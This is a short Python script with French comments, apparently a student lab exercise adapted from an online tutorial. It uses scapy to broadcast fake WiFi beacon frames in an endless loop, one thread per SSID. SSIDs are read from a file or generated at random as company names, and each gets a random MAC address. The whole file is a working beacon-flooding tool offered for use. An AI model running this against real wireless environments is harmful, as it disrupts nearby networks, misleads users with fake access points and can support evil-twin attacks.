from scapy.all import *
from faker import Faker
from threading import Thread
import argparse
import os

# Outil découvert pour le parsing d'arguments en python https://docs.python.org/3/library/argparse.html
# Outil découvert pour la génération d'adresse MAC et SSID aléatoire https://faker.readthedocs.io/en/master/providers/faker.providers.internet.html?highlight=mac%20address#faker.providers.internet.Provider.mac_address

parser = argparse.ArgumentParser()
parser.add_argument("-i", required=True)
parser.add_argument("-f", required=False)

args = parser.parse_args()

### Source : https://www.thepythoncode.com/article/create-fake-access-points-scapy
def send_beacon(ssid, mac):
    dot11 = Dot11(type=0, subtype=8, addr1="ff:ff:ff:ff:ff:ff", addr2=mac, addr3=mac)
    beacon = Dot11Beacon(cap="ESS+privacy")
    essid = Dot11Elt(ID="SSID", info=ssid, len=len(ssid))
    frame = RadioTap() / dot11 / beacon / essid
    sendp(frame, inter=0.1, loop=1, iface=args.i, verbose=0)



## Génére les différents SSID en fonction d'un fichier ou aléatoirement
def flood_ssid(path):
    ssid_list = []
	
    if path == None:
        # Pas de fichier, on demande combien de SSID on génère et on les crée aléatoirement
        nbr_ssid = int(input("Combien de SSID faut-il créer ? "))
        for i in range(nbr_ssid):
            ssid_list.append(Faker().company() + " Wifi")
    else:
    	# On récupère le contenu du fichier dans une liste, on enlève les lignes vides
        if os.path.isfile(path):
            with open(path, "r") as f:
            	# https://stackoverflow.com/questions/4842057/easiest-way-to-ignore-blank-lines-when-reading-a-file-in-python
    	        ssid_list = [line.strip() for line in f if line.strip()]

    print(ssid_list)
                   

    # On crée un Thread qui exécute la fonction send_beacon pour chaque SSID de la liste
    for ssid_name in ssid_list:
		    print(ssid_name)
		    Thread(target=send_beacon, args=(ssid_name, Faker().mac_address())).start()


flood_ssid(args.f)
